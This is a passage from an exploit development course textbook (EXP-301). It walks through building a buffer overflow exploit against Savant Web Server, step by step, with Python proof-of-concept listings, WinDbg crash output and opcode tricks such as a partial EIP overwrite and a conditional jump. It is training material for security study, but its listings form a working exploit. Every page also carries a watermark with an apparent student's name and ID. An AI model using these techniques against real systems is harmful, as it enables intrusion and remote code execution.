overwritten with the 0x42424242 value as shown in the upper half of our buffer. 
Let’s continue to further split the upper half of our buffer until we are able to accurately pinpoint 
the exact offset required to overwrite the instruction pointer with our 260-byte buffer. This results 
in a buffer of 253 bytes required prior to overwriting the instruction pointer. 
This can be verified by updating our proof of concept as follows. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 260 
 
  httpMethod = b"GET /" 
  inputBuffer = b"\x41" * 253 
  inputBuffer+= b"\x42\x42\x42\x42" 
  inputBuffer+= b"\x43" * (size - len(inputBuffer)) 
  httpEndRequest = b"\r\n\r\n" 
... 
Listing 179 - egghunter_0x04.py: Testing the offset of our overflow 
Running the proof of concept from Listing 179 and analyzing the crash in WinDbg confirms the 
offset. 
(13a0.b24): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
eax=ffffffff ebx=015656d0 ecx=95b16e78 edx=00000000 esi=015656d0 edi=0041703c 
eip=42424242 esp=0309ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
42424242 ??              ??? 
Listing 180 - Confirming the offset from msf-pattern_offset inside WinDbg 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
166 
Now that we have confirmed that the offset is correct, we need to find a good instruction to 
overwrite EIP with that will allow us to take control of the execution flow. 
As we did in previous modules, we are going to use the narly WinDbg extension to list the 
protections of the loaded modules. 
To make our exploit as portable as possible, we need to choose a module that comes with the 
application. In addition, the module should not be compiled with any protections. Let’s load the 
extension and list the protections of all loaded modules. 
0:008> .load narly 
... 
 
0:008> !nmod 
00400000 00452000 Savant               /SafeSEH OFF                
C:\Savant\Savant.exe 
687a0000 689a9000 comctl32_687a0000    /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\WinSxS\x86_microsoft.windows.common-
controls_6595b64144ccf1df_6.0.10240.17184_none_3bcab1476bcee5ec\comctl32.DLL 
6ad00000 6ad0b000 winrnr               /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\System32\winrnr.dll 
6ad10000 6ad26000 pnrpnsp              /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\system32\pnrpnsp.dll 
6ad50000 6ad62000 napinsp              /SafeSEH ON  /GS *ASLR *DEP 
C:\Windows\system32\napinsp.dll 
... 
Listing 181 - Loading the narly extension and listing the protections on all loaded modules 
Listing 181 shows that this application does not come with any other modules besides the main 
executable. Additionally, the Savant.exe module, compiled without any protections, seems to be 
mapped at an address that starts with a null byte. 
Having a null byte in the address space of the module is an issue, as the application treats our 
buffer as a string. A null byte, which is a string terminator, would truncate the string, preventing us 
from using even the small amount of space we have on the stack after overwriting the instruction 
pointer. 
While the limitations in our current test case are strict, they are not impossible to overcome. 
6.4.1.1 Exercises 
1. 
Use msf-pattern_create and msf-pattern_offset to determine the exact offset required to 
overwrite the instruction pointer. 
2. 
Use the narly extension to verify that there are no additional modules loaded in the address 
space of Savant.exe that are not provided by Microsoft. 
6.4.2 Partial EIP Overwrite 
Since the application does not come with any additional modules and the main executable, 
Savant.exe, contains a null byte in its address, we need a different approach. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
167 
Choosing an address from a Microsoft module would mean the exploit is dependent on whatever 
version of Windows is installed on our target. In addition, we would also have to deal with other 
mitigations that Microsoft introduces in its PEs, which we will cover in later modules. 
To overcome this issue, we will abuse something we discovered during the initial analysis of the 
crash. Specifically, we recall that our buffer is treated as a string and therefore a null byte is added 
at the end of it. 
Let’s run our previous proof of concept once more to confirm that this behavior is consistent 
across multiple crashes. 
(1738.a78): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
eax=ffffffff ebx=003d5750 ecx=731f61bf edx=00000000 esi=003d5750 edi=0041703c 
eip=42424242 esp=02fcea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
42424242 ??              ??? 
 
0:003> dds @esp L4 
02fcea2c  00434343 Savant+0x34343 
02fcea30  02fcea84 
02fcea34  0041703c Savant+0x1703c 
02fcea38  003d5750 
Listing 182 - Confirming our buffer ends with a null byte 
The output from Listing 182 shows that our buffer is null-terminated on concurrent crashes. This 
provides us with an interesting opportunity to use a technique known as a partial EIP overwrite. 
Because the Savant executable is mapped in an address range that begins with a null byte, we 
could use the string null terminator as part of our EIP overwrite. This will allow us to redirect the 
execution flow to whatever assembly instruction we choose within the Savant.exe module. 
Let’s update our proof of concept to only overwrite the lower three bytes of the EIP register as 
follows. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"GET /" 
  inputBuffer = b"\x41" * size 
  inputBuffer+= b"\x42\x42\x42" 
  httpEndRequest = b"\r\n\r\n" 
 
  buf = httpMethod + inputBuffer +  httpEndRequest 
... 
Listing 183 - egghunter_0x05.py: Attempting to partially overwrite the EIP register 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
168 
After we run the proof of concept, we inspect the crash in WinDbg. According to the output from 
Listing 184, our partial EIP overwrite was successful. 
(5dc.14b8): Break instruction exception - code 80000003 (first chance) 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
eax=00000000 ebx=003d56d0 ecx=0000000e edx=77eb4550 esi=003d56d0 edi=0041703c 
eip=00424242 esp=02efea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x24242: 
00424242 cc              int     3 
Listing 184 - Confirming our partial EIP overwrite inside WinDbg 
Having overcome this hurdle, we are now able to use an instruction that is present inside the 
Savant.exe module. While this is a good first step, now we must decide on what instruction we 
want to redirect the execution flow to. 
One side-effect of our partial instruction pointer overwrite is that we cannot store any data past 
the return address. This is because the added null byte will terminate the string. In such cases, we 
cannot use an instruction like JMP ESP because the ESP register will not point to our buffer. 
During our initial crash analysis, we noticed that the second DWORD on the stack at the time of 
the crash points very close to our current stack pointer. In fact, it always seems to point to the 
HTTP method, followed by the rest of the data we sent. 
0:003> dds @esp L5 
02efea2c  02effe70 
02efea30  02efea84 
02efea34  0041703c Savant+0x1703c 
02efea38  003d56d0 
02efea3c  003d56d0 
 
0:003> dc poi(@esp+0x04) 
02efea84  00544547 00000000 00000000 00000000  GET............. 
02efea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA 
02efeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
02efeab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
02efeac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
02efead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
02efeae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
02efeaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
Listing 185 - Inspecting the memory address that points further down the stack 
In Listing 185, we can confirm that this is still the case, even after modifying our initial proof of 
concept. Our goal now is to find an assembly instruction sequence that will redirect the execution 
flow to this data. 
To do this, we can use an instruction sequence such as POP R32; RET. The first POP would 
remove the first DWORD from the stack. This would make ESP point to the memory address that 
contains our buffer starting with the HTTP GET method. After executing the RET instruction, we 
should be placed right at the beginning of our HTTP method. Using such an instruction sequence 
would mean that we will have to execute the assembly instructions generated by the GET method 
opcodes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
169 
Before proceeding to find a POP R32; RET instruction sequence, let’s first inspect the generated 
instructions from our HTTP method. 
0:003> u poi(@esp+0x04) 
02efea84 47              inc     edi 
02efea85 45              inc     ebp 
02efea86 54              push    esp 
02efea87 0000            add     byte ptr [eax],al 
02efea89 0000            add     byte ptr [eax],al 
02efea8b 0000            add     byte ptr [eax],al 
02efea8d 0000            add     byte ptr [eax],al 
02efea8f 0000            add     byte ptr [eax],al 
Listing 186 - Inspecting the assembly instructions generated by the “GET” string 
The first instructions from Listing 186 do not seem to affect the execution flow or generate any 
access violations. They include an INC operation on the EDI and EBP registers followed by a 
PUSH instruction that pushes ESP to the stack. 
The next instructions, generated by the null bytes after the HTTP method, use the ADD operation. 
Here, the value of the AL register is added to the value that EAX is pointing to. These types of 
instructions can be problematic as they operate on the assumption that EAX points to a valid 
memory address. 
We already know that using a POP R32; RET instruction sequence will successfully redirect the 
execution flow to our buffer. As part of the POP instruction from our sequence, we can place the 
DWORD that ESP points to into the register of our choice. Let’s inspect the value that will be 
popped by the first instruction. 
0:003> dds @esp L5 
02efea2c  02effe70 
02efea30  02efea84 
02efea34  0041703c Savant+0x1703c 
02efea38  003d56d0 
02efea3c  003d56d0 
 
0:003> !teb 
TEB at 7ffdc000 
    ExceptionList:        02efff70 
    StackBase:            02f00000 
    StackLimit:           02efc000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
    ArbitraryUserPointer: 00000000 
    Self:                 7ffdc000 
    EnvironmentPointer:   00000000 
    ClientId:             000005dc . 000014b8 
    RpcHandle:            00000000 
    Tls Storage:          0028f508 
    PEB Address:          7ffdb000 
    LastErrorValue:       0 
    LastStatusValue:      c000000d 
    Count Owned Locks:    0 
    HardErrorMode:        0 
Listing 187 - Inspecting the DWORD that will be popped into a register 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
170 
Listing 187 shows the first DWORD on the stack (02effe70) points to a memory location that is 
part of the stack space and is therefore a valid memory address. 
This means that if we can find an instruction sequence like POP EAX; RET, we can guarantee that 
EAX will point to a valid memory address. Let’s run msf-nasm_shell and get the opcodes for the 
POP EAX; RET sequence. 
kali@kali:~$ msf-nasm_shell                       
nasm > pop eax 
00000000  58                pop eax 
 
nasm > ret 
00000000  C3                ret 
Listing 188 - Obtaining the opcodes for our POP EAX; RET instruction sequence 
Now that we have the opcodes for our instruction sequence, we can search for this sequence 
inside WinDbg. 
0:003> lm m Savant 
Browse full module list 
start    end        module name 
00400000 00452000   Savant   C (no symbols) 
 
0:004> s -[1]b 00400000 00452000 58 c3 
0x00418674 
0x0041924f 
0x004194f6 
0x00419613 
0x0041a531 
0x0041af7f 
... 
Listing 189 - Searching for a POP EAX; RET instruction in the memory range of Savant.exe 
Once we choose a memory address that points to our instruction sequence and does not contain 
bad characters, we will update our proof of concept to use it. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"GET /" 
  inputBuffer = b"\x41" * size 
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  buf = httpMethod + inputBuffer +  httpEndRequest 
... 
Listing 190 - egghunter_0x06.py: Redirecting execution flow to our HTTP method 
Before running the proof of concept from Listing 190, we set a breakpoint at the memory address 
pointing to the POP EAX; RET instruction sequence. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
171 
0:008> bp 0x00418674 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
 
0:003> bl 
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674 
      
0:008> g 
Breakpoint 0 hit 
eax=00000000 ebx=015d5750 ecx=0000000e edx=77d94550 esi=015d5750 edi=0041703c 
eip=00418674 esp=0305ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18674: 
00418674 58              pop     eax 
Listing 191 - Hitting the breakpoint at our POP EAX; RET instruction sequence 
Listing 191 shows that we hit our breakpoint. We now have a reliable and portable way of 
redirecting execution flow. Let’s try to single-step through the instructions and return into our 
data. 
0:003> t 
eax=0305fe70 ebx=015d5750 ecx=0000000e edx=77d94550 esi=015d5750 edi=0041703c 
eip=00418675 esp=0305ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18675: 
00418675 c3              ret 
 
0:003> t 
eax=0305fe70 ebx=015d5750 ecx=0000000e edx=77d94550 esi=015d5750 edi=0041703c 
eip=0305ea84 esp=0305ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
0305ea84 47              inc     edi 
 
0:003> u @eip 
0305ea84 47              inc     edi 
0305ea85 45              inc     ebp 
0305ea86 54              push    esp 
0305ea87 0000            add     byte ptr [eax],al 
0305ea89 0000            add     byte ptr [eax],al 
0305ea8b 0000            add     byte ptr [eax],al 
0305ea8d 0000            add     byte ptr [eax],al 
0305ea8f 0000            add     byte ptr [eax],al 
 
0:003> dc @eip 
0305ea84  00544547 00000000 00000000 00000000  GET............. 
0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA 
0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
Listing 192 - Stepping through the POP EAX; RET instruction sequence 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
172 
Listing 192 shows that after the RET instruction, our instruction pointer points to the first 
assembly instruction (INC EDI) generated by the opcodes of the HTTP GET method. 
Because we made sure that EAX would contain a valid memory address, we should be able to 
execute these instructions without generating an access violation, until we reach our buffer of 
0x41 characters. 
While this solution works, executing assembly instructions generated by the opcodes of our 
HTTP method is not very clean. Let’s explore some other options in the hopes of finding a more 
elegant way of reaching the start of our 0x41 buffer. 
6.4.2.1 Exercises 
1. 
Update your proof of concept to partially overwrite the instruction pointer. Make sure you 
take the time to understand how and why such a technique works. 
2. 
Find a valid instruction sequence that would redirect the execution flow to your data. If you 
use a different register in the first POP instruction, could you still let the execution flow 
proceed without any issues until you reach your 0x41 buffer? 
3. 
Update your proof of concept with the instruction sequence from Exercise 2. Set and hit a 
breakpoint at the memory address of the instruction sequence. 
6.4.3 Changing the HTTP Method 
In order to find a more elegant way to reach our buffer of 0x41 characters, we need to take a 
closer look at our crash. Let’s run our proof of concept once more and stop right before the RET 
instruction. Before executing the instruction, we will inspect the memory we are about to return 
into with the dc (display DWORD + ASCII) command. 
... 
eax=0305fe70 ebx=00195750 ecx=0000000e edx=77d94550 esi=00195750 edi=0041703c 
eip=00418675 esp=0305ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18675: 
00418675 c3              ret 
 
0:003> dc poi(@esp) 
0305ea84  00544547 00000000 00000000 00000000  GET............. 
0305ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA 
0305eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0305eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
Listing 193 - Inspecting the buffer we return into 
In Listing 193, we notice a padding of null bytes between the HTTP method and our other data. 
While reverse-engineering the inner workings of the Savant Web Server software is outside the 
scope of this module, we can make some assumptions based on what we observe inside 
WinDbg. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
173 
The buffer used to store the HTTP method seems to be allocated with a fixed size. Furthermore, it 
appears that the buffer is quite large, based on what it’s meant to store. 
The difference between the size of the allocation storing the HTTP method and the size of the 
method itself makes us question whether or not there are any checks implemented for the HTTP 
method. If there are no checks, we could attempt to replace it with opcodes for assembly 
instructions that would allow us to jump to our 0x41 field buffer. 
Let’s update our proof of concept and replace the GET method with some hex bytes of our 
choice: 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x43\x43\x43\x43\x43\x43\x43\x43" + b" /" 
  inputBuffer = b"\x41" * size 
  inputBuffer+= pack("<L", (0x418674))  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  buf = httpMethod + inputBuffer +  httpEndRequest 
... 
Listing 194 - egghunter_0x07.py: Replacing the HTTP method 
Before running the proof of concept, we will re-attach WinDbg to Savant and set a breakpoint at 
our POP EAX; RET instruction sequence. 
0:008> bp 0x00418674 
*** WARNING: Unable to verify checksum for C:\Savant\Savant.exe 
*** ERROR: Module load completed but symbols could not be loaded for 
C:\Savant\Savant.exe 
 
0:008> bl 
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674 
      
0:008> g 
Breakpoint 0 hit 
eax=00000000 ebx=01465750 ecx=0000000e edx=77d94550 esi=01465750 edi=0041703c 
eip=00418674 esp=0304ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18674: 
00418674 58              pop     eax 
 
0:003> dc poi(@esp+4) 
0304ea84  43434343 43434343 00000000 00000000  CCCCCCCC........ 
0304ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA 
0304eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0304eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0304eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0304ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0304eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
0304eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA 
Listing 195 - Triggering the crash with the updated HTTP method 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
174 
The output from Listing 195 shows that we were able to successfully change our HTTP method 
to an invalid one without affecting the crash. We hit our breakpoint, and when inspecting the 
memory address located on the stack, our HTTP method was updated with 0x43 (“C”) characters. 
This could be an opportunity to use a short jump as we did in a previous module. According to the 
output from Listing 195, if we use a short jump of 0x17 bytes, we should end up in our buffer. 
Let’s update our proof of concept to include the short jump. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\xeb\x17\x90\x90" + b" /"  # Short jump of 0x17 
  inputBuffer = b"\x41" * size 
  inputBuffer+= pack("<L", (0x418674))      # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
  buf = httpMethod + inputBuffer +  httpEndRequest 
... 
Listing 196 - egghunter_0x08.py: Replacing the HTTP method with a short jump 
Before running the proof of concept, we need to set a breakpoint at the address of our POP EAX; 
RET instruction sequence. This will allow us to single-step through the assembly code and 
confirm that our jump is correct and that we reach the desired memory address. 
Breakpoint 0 hit 
eax=00000000 ebx=01475750 ecx=0000000e edx=77d94550 esi=01475750 edi=0041703c 
eip=00418674 esp=0306ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18674: 
00418674 58              pop     eax 
 
0:003> t 
eax=0306fe70 ebx=01475750 ecx=0000000e edx=77d94550 esi=01475750 edi=0041703c 
eip=00418675 esp=0306ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18675: 
00418675 c3              ret 
 
0:003> t 
eax=0306fe70 ebx=01475750 ecx=0000000e edx=77d94550 esi=01475750 edi=0041703c 
eip=0306ea84 esp=0306ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
0306ea84 cb              retf                                        .. 
 
0:003> db @eip L2 
0306ea84  cb 17                                            .. 
 
0:003> u @eip 
0306ea84 cb              retf 
0306ea85 17              pop     ss 
0306ea86 90              nop 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
175 
0306ea87 90              nop 
0306ea88 0000            add     byte ptr [eax],al 
0306ea8a 0000            add     byte ptr [eax],al 
0306ea8c 0000            add     byte ptr [eax],al 
0306ea8e 0000            add     byte ptr [eax],al 
 
Listing 197 - Discovering the additional bad character 
In Listing 197, we find that instead of our short jump assembly instruction, we get an unexpected 
RETF146 instruction. 
We previously tested for bad characters by sending all possible hex values to the vulnerable 
application, but this character was not mangled. Given that this memory is most likely allocated 
separately from the allocation storing the rest of our buffer, it is possible that different operations 
are done that cause our byte to get mangled. 
The above instance is an ideal example in which we find that different memory allocations will 
have different operations and checks performed on the data stored in them. This means that in 
such cases, we may find a completely different set of bad characters than initially discovered. 
Let’s try to find alternatives that will yield the same results as a short jump. 
6.4.3.1 Exercises 
1. 
Take your latest proof of concept and attempt to replace the HTTP method with bytes of 
your choice. 
2. 
Confirm that replacing the HTTP method does not alter our crash and we are still able to 
overwrite the instruction pointer. 
3. 
Attempt to use a short jump and confirm that the 0xEB byte from our short jump is mangled 
before it is stored in memory. Are there any others?  
6.4.4 Conditional Jumps 
Since we can’t use a short jump, we need to find an alternative solution that will place us in our 
buffer. One way to solve this problem, for example, is to perform arithmetic operations on the ESP 
register and make it point to the beginning of our buffer. While that is certainly an option, we 
would like to determine if we can use a different kind of instruction that would take us to the exact 
location as our short jump. 
Conditional Jumps147 are the most common way to transfer control in assembly. As the name 
implies, they execute a jump depending on specific conditions. This process occurs in two steps, 
the first one being a test on the condition followed by a jump if the condition is true, or continue 
the execution without jumping if false. 
 
146 (80x86 Instructions), http://spike.scu.edu.au/~barry/80x86_inst.html#RET 
147 (Conditional Jumps Instructions Lecture), 
http://www.philadelphia.edu.jo/academics/qhamarsheh/uploads/Lecture%2018%20Conditional%20Jumps%20Instructions.pdf 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
176 
 
There are a number of conditional jumps148 in the assembly language that 
depend on registry values, FLAG149 registers, and comparisons between signed 
or unsigned operands. We encourage you to read up on them and get 
comfortable with how they work. 
While we do have a limited memory space that is allocated for the HTTP method, it should still be 
more than enough for us to set up a condition followed by a jump for that condition. 
Our conditional jump of choice is JE.150 This instruction will execute a short jump and the 
condition for this jump is based on the value of the Zero Flag151 (ZF) register. More specifically, 
the jump will be taken if the value of the ZF register is set to 1 (TRUE). 
The Zero Flag register is a single bit flag that is used on most architectures. On 
x86/x64, it is stored in a dedicated register called ZF. This flag is used to check 
the result of arithmetic operations. It is set to 1 (TRUE) if the result of an 
arithmetic operation is zero and otherwise set to 0 (FALSE). 
To use this conditional jump as part of our exploit, we need to guarantee that the ZF will always 
be 1 (TRUE). We can do this in two steps. First, we use an XOR152 operation instruction with ECX 
as both destination (the first operand) and source (the second operand). 
The XOR instruction does a bitwise operation. The resultant bit is set to 1 only if 
the bit from the other operand is different. Using the XOR bitwise operation with 
the same destination and source will always result in 0. This is a common way to 
null a register. 
While we chose to use the ECX register for our XOR operation, using other 
registers will produce the same result. 
Once we null the ECX register, we can use a TEST153 instruction with ECX for both operands. In 
our case, this will set the ZF to 1 (TRUE). 
 
148 (Faydoc - All Assembly Jump Instructions), http://faydoc.tripod.com/cpu/index_j.htm 
149 (Wikipedia - FLAGS register, 2020), https://en.wikipedia.org/wiki/FLAGS_register 
150 (CIS-77 - Brief x86 Instruction Set Reference), http://www.c-jump.com/CIS77/reference/ISA/DDU0098.html 
151 (Wikipedia - Zero Flag, 2019), https://en.wikipedia.org/wiki/Zero_flag 
152 (XOR - x86 Instruction Set Reference), https://c9x.me/x86/html/file_module_x86_id_330.html 
153 (TEST - x86 Instruction Set Reference), https://c9x.me/x86/html/file_module_x86_id_315.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
177 
 
TEST performs a bit-wise logical AND154 operation and sets the ZF (amongst 
others) according to the result. The AND operation sets each bit to 1 if both 
corresponding bits of the operands are 1, otherwise, it is set to 0. 
Let’s use msf-nasm_shell again to get the opcodes for our two instructions. 
kali@kali:~$ msf-nasm_shell 
nasm > xor ecx, ecx 
00000000  31C9              xor ecx,ecx 
 
nasm > test ecx, ecx 
00000000  85C9              test ecx,ecx 
 
nasm > je 0x17 
00000000  0F8411000000      jz near 0x17 
Listing 198 - Using msf-nasm_shell to obtain the opcodes for our conditional jump 
Both JE and JZ conditional jumps check if the ZF is set as a condition. Because 
of this, they have the same opcodes and various tools will use them 
interchangeably. 
The opcodes generated in Listing 198 do not seem to include bad characters except for the 
conditional jump opcodes, which include three null bytes. 
At first glance, this seems problematic, but remember that the memory allocation is zeroed out 
before the HTTP method is copied to it. This means that we don’t necessarily need to send the 
null bytes. We can just send the first opcodes and use the existing null bytes to complete our 
instruction. 
Here is an updated proof of concept that includes all of the changes. 
... 
try: 
  server = sys.argv[1] 
  port = 80 
  size = 253 
 
  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; 
je 0x17  
  inputBuffer = b"\x41" * size 
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret 
  httpEndRequest = b"\r\n\r\n" 
 
 
154 (AND - x86 Instruction Set Reference), https://c9x.me/x86/html/file_module_x86_id_12.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
178 
  buf = httpMethod + inputBuffer +  httpEndRequest 
... 
Listing 199 - egghunter_0x09.py: Replacing the HTTP method with a conditional jump 
Before we run the proof of concept, we once again set a breakpoint at the address of our POP 
EAX; RET instruction sequence. Once we hit our breakpoint, we will single-step through the 
instructions. Before we execute the return, we use the u (unassemble) command to display the 
next three instructions to be executed in order to confirm the opcodes have not been mangled. 
eax=02fefe70 ebx=01565750 ecx=0000000e edx=77d94550 esi=01565750 edi=0041703c 
eip=00418675 esp=02feea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
Savant+0x18675: 
00418675 c3              ret 
 
0:003> u poi(@esp) L3 
02feea84 31c9            xor     ecx,ecx 
02feea86 85c9            test    ecx,ecx 
02feea88 0f8411000000    je      02feea9f 
Listing 200 - Verifying that our instructions were not mangled in memory. 
The output in Listing 200 shows our expected instructions in memory. This confirms that they did 
not contain any bad characters. 
Let’s single-step through the XOR and TEST instructions. Before we execute the conditional jump, 
we want to verify the ZF register value and the destination of our jump. 
eax=02fefe70 ebx=01565750 ecx=00000000 edx=77d94550 esi=01565750 edi=0041703c 
eip=02feea88 esp=02feea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02feea88 0f8411000000    je      02feea9f                                [br=1] 
 
0:003> r @zf 
zf=1 
 
0:003> dd 02feea9f - 4 
02feea9b  41412f00 41414141 41414141 41414141 
02feeaab  41414141 41414141 41414141 41414141 
02feeabb  41414141 41414141 41414141 41414141 
02feeacb  41414141 41414141 41414141 41414141 
02feeadb  41414141 41414141 41414141 41414141 
02feeaeb  41414141 41414141 41414141 41414141 
02feeafb  41414141 41414141 41414141 41414141 
02feeb0b  41414141 41414141 41414141 41414141 
Listing 201 - Displaying the value of the ZF register and the destination of the conditional jump 
Excellent! The ZF register is set to 1 (TRUE), meaning that our jump will be taken. Furthermore, if 
we check the destination of the jump, we find that we will land two bytes into our buffer of 0x41 
characters. 
As a final step, let’s execute the conditional jump and redirect the flow of execution to our 0x41 
buffer: 
0:003> r 
eax=02fefe70 ebx=01565750 ecx=00000000 edx=77d94550 esi=01565750 edi=0041703c 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
